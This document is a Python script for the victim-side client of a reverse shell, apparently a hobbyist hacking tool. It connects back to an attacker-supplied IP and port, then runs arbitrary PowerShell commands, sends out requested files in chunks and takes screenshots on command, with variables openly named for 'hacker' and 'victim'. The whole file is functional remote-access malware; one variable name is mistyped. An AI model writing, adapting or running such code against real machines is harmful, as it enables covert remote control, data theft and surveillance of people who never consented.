#! /usr/bin/python3

import socket, subprocess
import time, os, pyautogui
import pyfiglet, termcolor

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
eof_identifier = "<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048


if __name__ == "__main__":

    hacker_IP = input(termcolor.colored("[+] Enter your Ip address: ", color="green", attrs=["bold"]))
    hacker_Port = input(termcolor.colored("[+] Select port to listen on: ", color="green", attrs=["bold"]))
    hacker_address = (str(hacker_IP), int(hacker_port))
    
    while True:
        try:
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
            print(termcolor.colored("[*] Trying to connect with ", color="yellow", attrs=["bold"]))
            print(termcolor.colored(hacker_address, color="white", attrs=["bold"]))
            victim_socket.connect(hacker_address)
            while True:    
                data = victim_socket.recv(1024)

                hacker_command = data.decode()
                print(termcolor.colored("[$] Hacker command = ", color="blue", attrs=["bold"]), end="")
                print(termcolor.colored(hacker_command, color="green", attrs=["bold"]))
                if hacker_command == "stop":
                    break
                elif hacker_command == "":
                    continue
                elif hacker_command.startswith("cd"):
                    path2move = hacker_command.strip("cd ")
                    if os.path.exists(path2move):
                        os.chdir(path2move)
                    else:
                        print(termcolor.colored("[!] Cannot change dir to ", color="yellow", attrs=["bold"]), end="")
                        print(termcolor.colored(path2move, color="white", attrs=["bold"]))
                    continue
                elif hacker_command.startswith("download"):
                    file_to_download = hacker_command.strip("download ")
                    if os.path.exists(file_to_download):
                        exists = "yes"
                        victim_socket.send(exists.encode())

                        with open(file_to_download, "rb") as file:
                            chunk = file.read(CHUNK_SIZE)

                            while len(chunk) > 0:
                                victim_socket.send(chunk)
                                chunk = file.read(CHUNK_SIZE)
                                # This will run till the end of file.

                            # once the file is complete, we need to send the marker.
                            victim_socket.send(eof_identifier.encode())
                        print(termcolor.colored("[+] File sent successfully!", color="green", attrs=["bold"]))

                    else:
                        exists = "no"
                        print(termcolor.colored("[!] File doesn't exist", color="red", attrs=["bold"]))
                        victim_socket.send(exists.encode())
                        continue     
                elif hacker_command == "screenshot":
                    print(termcolor.colored("[+] Taking Screenshot!", color="yellow", attrs=["bold"]))
                    screenshot = pyautogui.screenshot()
                    screenshot.save("screenshot.png")
                    print(termcolor.colored("[+] Screenshot Saved!", color="green", attrs=["bold"]))

                else:
                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr
                    
                    victim_socket.sendall(command_result)
        except KeyboardInterrupt:
            print(termcolor.colored("[!] Exiting...", color="red", attrs=["bold"]))
        except Exception as err:
            print(termcolor.colored("[!] Unable to connect: ", color="red", attrs=["bold"]), end="")
            print(termcolor.colored(err, color="white", attrs=["bold"]))
            time.sleep(5)
        
